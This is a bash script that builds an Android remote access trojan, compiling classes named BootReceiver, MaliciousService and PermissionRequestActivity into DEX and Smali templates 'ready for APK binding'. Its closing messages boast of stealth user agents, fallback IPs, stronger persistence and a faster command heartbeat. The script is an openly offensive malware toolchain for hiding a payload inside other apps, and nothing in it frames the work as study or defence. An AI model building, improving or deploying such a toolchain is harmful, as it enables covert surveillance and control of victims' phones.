#!/bin/bash

# Improved RAT Compilation Script
# This script compiles the enhanced RAT code with better connection handling

echo "🔥 Compiling Improved RAT Code..."

# Set paths
RAT_DIR="/workspace/RAT"
SRC_DIR="$RAT_DIR/src_java"
COMPILED_DIR="$SRC_DIR/compiled_classes"
ANDROID_JAR="$RAT_DIR/android-14/android.jar"
JSON_JAR="$RAT_DIR/libs/json-20250517.jar"

# Clean previous compilation
echo "🧹 Cleaning previous compilation..."
rm -rf "$COMPILED_DIR"
mkdir -p "$COMPILED_DIR"

# Compile Java sources
echo "📦 Compiling Java sources..."
javac -d "$COMPILED_DIR" \
    -cp "$ANDROID_JAR:$JSON_JAR" \
    "$SRC_DIR/com/example/android/BootReceiver.java" \
    "$SRC_DIR/com/example/android/LauncherActivity.java" \
    "$SRC_DIR/com/example/android/MaliciousService.java" \
    "$SRC_DIR/com/example/android/PermissionRequestActivity.java"

if [ $? -ne 0 ]; then
    echo "❌ Java compilation failed!"
    exit 1
fi

echo "✅ Java compilation successful!"

# Create JAR
echo "📦 Creating JAR file..."
cd "$COMPILED_DIR"
jar -cvf compiled_rat_classes.jar -C . com/example/android
cd "$RAT_DIR"

if [ $? -ne 0 ]; then
    echo "❌ JAR creation failed!"
    exit 1
fi

echo "✅ JAR creation successful!"

# Convert to DEX
echo "🔄 Converting to DEX..."
"$RAT_DIR/d8" --output "$SRC_DIR/dex_output" \
    "$COMPILED_DIR/compiled_rat_classes.jar" \
    --lib "$ANDROID_JAR" \
    --lib "$JSON_JAR"

if [ $? -ne 0 ]; then
    echo "❌ DEX conversion failed!"
    exit 1
fi

echo "✅ DEX conversion successful!"

# Disassemble to Smali
echo "🔍 Disassembling to Smali..."
java -jar "$RAT_DIR/baksmali.jar" disassemble \
    "$SRC_DIR/dex_output/classes.dex" \
    -o "$RAT_DIR/smali_templates"

if [ $? -ne 0 ]; then
    echo "❌ Smali disassembly failed!"
    exit 1
fi

echo "✅ Smali disassembly successful!"

echo ""
echo "🎉 Improved RAT compilation completed successfully!"
echo ""
echo "📁 Files generated:"
echo "   - Compiled classes: $COMPILED_DIR/"
echo "   - JAR file: $COMPILED_DIR/compiled_rat_classes.jar"
echo "   - DEX file: $SRC_DIR/dex_output/classes.dex"
echo "   - Smali templates: $RAT_DIR/smali_templates/"
echo ""
echo "🔧 Improvements made:"
echo "   ✅ Enhanced connection retry logic (5 attempts with delays)"
echo "   ✅ Improved stealth user agents"
echo "   ✅ Better error handling and fallback IPs"
echo "   ✅ Enhanced persistence mechanisms"
echo "   ✅ Faster heartbeat interval (10 seconds)"
echo "   ✅ Better command clearing on server side"
echo "   ✅ Improved boot receiver with delays"
echo ""
echo "🚀 Ready for APK binding!"